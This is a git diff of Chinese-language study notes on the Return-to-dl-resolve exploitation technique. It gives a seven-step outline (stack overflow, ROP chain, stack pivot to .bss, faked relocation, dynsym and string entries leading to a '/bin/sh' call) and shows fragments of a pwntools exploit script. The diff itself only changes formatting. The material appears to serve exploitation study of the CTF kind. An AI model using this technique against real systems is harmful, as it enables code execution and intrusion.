@@ -1,12 +1,12 @@
 # Return-to-dl-resolve
-&#8195;参加大佬的讲解，非常非常的详细！！！这里简单总结为如下的内容，主要需要了解动态重定向的过程。其实感觉这样一步一步的fake，貌似还更容易理解
-1、通过栈溢出，构造rop，向bss段某位置写入数据
-2、将栈地址改向bss段
-3、写入正常的shellcode，使用write输出‘/bin/sh’（通过write plt）
-4、修改为通过plt 0，给出reloc的偏移
-5、构造假的重定向表，给出在动态链接符号表中的偏移
-6、构造假的dynsym，给出在字符串表中的偏移
-7、构造所需函数的字符串名字，改变参数
+&#8195;参加大佬的讲解，非常非常的详细！！！这里简单总结为如下的内容，主要需要了解动态重定向的过程。其实感觉这样一步一步的fake，貌似还更容易理解<br>
+1、通过栈溢出，构造rop，向bss段某位置写入数据<br>
+2、将栈地址改向bss段<br>
+3、写入正常的shellcode，使用write输出‘/bin/sh’（通过write plt）<br>
+4、修改为通过plt 0，给出reloc的偏移<br>
+5、构造假的重定向表，给出在动态链接符号表中的偏移<br>
+6、构造假的dynsym，给出在字符串表中的偏移<br>
+7、构造所需函数的字符串名字，改变参数<br>
 
 
 ## vuln code
@@ -33,6 +33,8 @@ int main()
 ```
 
 ## exp
+
+```
 from pwn import *
 import time,sys,binascii
 
@@ -106,3 +108,5 @@ payload2 += 'a' * (0x100 - len(payload2))
 io.send(payload2)
 
 io.interactive()
+
+```
